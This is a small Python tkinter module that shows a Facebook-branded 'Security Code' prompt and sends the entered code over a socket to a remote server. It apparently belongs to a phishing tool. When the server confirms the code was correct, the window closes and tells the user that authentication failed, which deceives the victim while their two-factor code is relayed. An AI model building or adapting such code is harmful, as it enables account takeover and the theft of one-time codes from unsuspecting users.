from tkinter import messagebox
from tkinter.ttk import *;
from tkinter import *;

def F_two_factor(res,mylabel,client):
    def chk_code(code):
        client.send(code.encode())
        # security code is wrong or not
        result = client.recv(1024).decode()
        print(result)
        if(result == "True"):
            fwindow.destroy()
            mylabel.config(text="Fail to authenticate,\n Check your email or try next authentication")
        else:
            rlbl.config(text="Security code is wrong,check again")
    if(res):
        fwindow = Toplevel()
        fwindow.geometry("400x180")
        fwindow.resizable(False,False)
        fwindow.title("Facebook Authentication")
        rlbl = Label(fwindow,text="",font=("Arial",7),foreground="maroon")
        rlbl.pack(pady=6)
        Label(fwindow,text="Security Code").pack(pady=10)
        code = Entry(fwindow,width=13)
        code.focus_set()
        code.pack(pady=10)
        Button(fwindow,text="authenticate",width=15,command=lambda:chk_code(code=code.get())).pack(pady=8)
    else:
        #result
        mylabel.config(text="Fail to authenticate,\n Check your email or try next authentication")